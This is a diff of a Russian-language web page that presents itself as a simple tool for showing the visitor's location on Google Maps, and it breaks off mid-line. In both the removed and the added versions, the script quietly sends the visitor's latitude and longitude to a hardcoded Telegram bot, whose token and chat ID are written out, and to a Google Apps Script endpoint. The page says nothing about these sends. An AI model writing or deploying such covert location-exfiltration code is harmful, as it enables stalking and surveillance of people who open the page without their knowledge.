@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Геолокация</title>
   <style>
     body {
@@ -13,7 +13,7 @@
       width: 100%;
       height: 300px;
       margin-top: 20px;
-      border: 1px solid #ccc;
+      display: none;
     }
     a {
       display: inline-block;
@@ -24,76 +24,41 @@
   </style>
 </head>
 <body>
-  <h1>🌍 Геолокация</h1>
-  <p id="status">⏳ Ожидание разрешения на доступ к геолокации...</p>
-  <a id="mapLink" href="#" target="_blank" style="display:none;">📍 Открыть в Google Maps</a>
-  <div id="map" style="display:none;"></div>
+  <h1>📍 Геолокация</h1>
+  <p id="status">⏳ Получение координат...</p>
+  <a id="mapLink" href="#" target="_blank" style="display:none;">Открыть в Google Maps</a>
+  <div id="map"></div>
 
   <script>
-    function coordsChanged(lat1, lon1, lat2, lon2) {
-      const R = 6371000;
-      const toRad = x => x * Math.PI / 180;
-      const dLat = toRad(lat2 - lat1);
-      const dLon = toRad(lon2 - lon1);
-      const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon/2)**2;
-      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-      const distance = R * c;
-      return distance > 10;
-    }
-
     function success(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
+      // Показать координаты на странице
       document.getElementById('status').textContent =
-        `Ваши координаты: широта ${latitude.toFixed(6)}, долгота ${longitude.toFixed(6)}`;
+        `Ваши координаты:\nШирота: ${latitude}, Долгота: ${longitude}`;
 
-      const prev = JSON.parse(localStorage.getItem('lastCoords'));
-      const changed = !prev || coordsChanged(prev.lat, prev.lon, latitude, longitude);
-
-      if (changed) {
-        // Отправка в Telegram
-        fetch('https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: 6249456543,
-            text: `📍 Новое местоположение:\nШирота: ${latitude}\nДолгота: ${longitude}`
-          })
-        });
-
-        // Отправка в Google Таблицу
-        fetch('https://script.google.com/macros/s/AKfycbwfaWCPXIXSAHA5yHrvPl1Nr0uTQ08Tf9pvK0SQMj9KBlDRyiHcIeLsM-jaw0VtYKqrYQ/exec', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ lat: latitude, lon: longitude })
-        });
-
-        localStorage.setItem('lastCoords', JSON.stringify({ lat: latitude, lon: longitude }));
-      }
-
-      // Google Maps
-      const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      // Показать ссылку на карту
       const mapLink = document.getElementById('mapLink');
-      mapLink.href = link;
+      mapLink.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
       mapLink.style.display = 'inline-block';
 
-      const mapFrame = document.getElementById('map');
-      mapFrame.innerHTML = `<iframe width="100%" height="300" style="border:0"
+      // Показать встроенную карту
+      const mapDiv = document.getElementById('map');
+      mapDiv.innerHTML = `<iframe width="100%" height="300" style="border:0"
         src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"
         allowfullscreen></iframe>`;
-      mapFrame.style.display = 'block';
-    }
+      mapDiv.style.display = 'block';
 
-    function error() {
-      document.getElementById('status').textContent = '❌ Не удалось получить местоположение.';
-    }
+      // Отправка в Telegram
+      fetch("https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: 6249456543,
+          text: `📡 Новая геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}`
+        })
+      });
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error);
-    } else {
-      document.getElementById('status').textContent = '❌ Геолокация не поддерживается этим браузером.';
-    }
-  </script>
-</body>
-</html>
+      // Отправка в Google Таблицу
+      fetch("https://scr
